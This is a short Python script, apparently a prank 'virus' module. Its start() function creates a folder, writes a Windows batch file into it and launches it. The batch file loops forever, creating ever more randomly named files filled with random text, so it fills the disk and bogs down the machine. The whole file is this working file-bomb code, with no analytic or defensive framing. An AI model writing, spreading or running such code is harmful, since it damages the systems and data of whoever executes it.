EROORS = 0
try:
    from os import system, mkdir, chdir
except:
    print("")
    EROORS += 1

def start(folder_name="LOL",filename_extension="LOL"):
    try:
        mkdir(f"{folder_name}")
        open(f"{folder_name}/start.bat", "w").write(f":virus\necho %random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random% CREATED BY PYTHON MODULE VIRUS!!! %random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%_%random% > %random%_%random%_%random%_%random%_%random%_%random%_%random%_%random%.{filename_extension}\ngoto virus")
    except:
        print('')
    chdir(f'{folder_name}')
    system('start.bat')